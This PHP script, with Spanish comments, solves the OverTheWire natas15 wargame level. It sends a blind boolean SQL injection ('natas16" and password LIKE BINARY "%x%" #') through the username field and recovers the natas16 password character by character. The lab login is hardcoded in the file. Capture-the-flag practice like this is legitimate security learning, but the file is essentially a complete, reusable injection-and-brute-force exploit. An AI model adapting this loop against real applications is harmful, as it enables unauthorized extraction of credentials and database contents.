<?php

$caracteres = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
$tamanio_c = strlen($caracteres);

$almacen = "";
$contrasena = "";

$coneccion = curl_init();

$url = "http://natas15.natas.labs.overthewire.org/index.php?debug";
$username = "natas15";
$password = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB";

echo "Buscando caracteres coincidentes...\n";
for ($i = 0; $i < $tamanio_c; $i++) {
    #se indica el usuario natas16 y que realize la busqueda like binary de concidencias en la contraseña de ese usuario 
    $peticion=http_build_query(array('username' => 'natas16" and password LIKE BINARY "%' . $caracteres[$i] . '%" #'));
    curl_setopt_array($coneccion, array(
        CURLOPT_URL => $url,
        CURLOPT_HTTPAUTH => CURLAUTH_ANY,
        CURLOPT_USERPWD => "$username:$password",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => 1,
        CURLOPT_POSTFIELDS => $peticion
    ));

    $coneccion_S = curl_exec($coneccion);
    if ($coneccion_S === false) {
        echo 'Curl error: ' . curl_error($coneccion) . "\n";
        continue;
    }

    if (stripos($coneccion_S, "exists") !== false) {
        echo "existe " . $caracteres[$i] . "\n";
        $almacen .= $caracteres[$i];
    } else {
        echo "no existe  " . $caracteres[$i] . "\n";
    }
}

$tamanio_almacen = strlen($almacen);
for ($i = 0; $i < 32; $i++) {
    for ($j = 0; $j < $tamanio_almacen; $j++) {
        #en la peticion post se agrega el campo contraseña y se busca las coincidencias con los caracteres obtenidos  
        $peticion2=http_build_query(array('username' => 'natas16" and password LIKE BINARY "'.$contrasena . $almacen[$j] . '%" #'));
        curl_setopt_array($coneccion, array(
            CURLOPT_URL => $url,
            CURLOPT_HTTPAUTH => CURLAUTH_ANY,
            CURLOPT_USERPWD => "$username:$password",
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => 1,
            CURLOPT_POSTFIELDS => $peticion2
        ));

        $coneccion_S = curl_exec($coneccion);
       
        if (stripos($coneccion_S, "exists") !== false) {
            $contrasena .= $almacen[$j];#Si existe el caracter en esa posicion se asigna a la contraseña 
            echo "Caracteres " . $contrasena . "\n";
            break;
        }
    }
}

echo "Password: " . $contrasena . "\n";

curl_close($coneccion); 
?>
